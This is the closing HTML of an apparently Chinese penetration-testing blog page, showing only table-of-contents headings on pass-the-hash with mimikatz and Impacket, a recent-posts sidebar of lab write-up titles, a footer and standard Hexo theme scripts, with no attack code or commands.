href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.</span> <span class="toc-text">哈希传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8mimikatz%E8%BF%9B%E8%A1%8CPTH"><span class="toc-number">1.9.1.</span> <span class="toc-text">1.利用mimikatz进行PTH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Impacket%E8%BF%9B%E8%A1%8CPTH"><span class="toc-number">1.9.2.</span> <span class="toc-text">2.利用Impacket进行PTH</span></a></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC4 &amp; DC5"></a><div class="content"><a class="title" href="/2024/01/23/DC4%20&amp;%20DC5/" title="DC4 &amp; DC5">DC4 &amp; DC5</a><time datetime="2024-01-23T09:30:58.103Z" title="发表于 2024-01-23 17:30:58">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网信息搜集"></a><div class="content"><a class="title" href="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="内网信息搜集">内网信息搜集</a><time datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC3"></a><div class="content"><a class="title" href="/2024/01/23/DC2%20&amp;%20DC3/" title="DC1 &amp; DC3">DC1 &amp; DC3</a><time datetime="2024-01-23T09:28:25.268Z" title="发表于 2024-01-23 17:28:25">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-01-23T09:22:35.758Z" title="发表于 2024-01-23 17:22:35">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>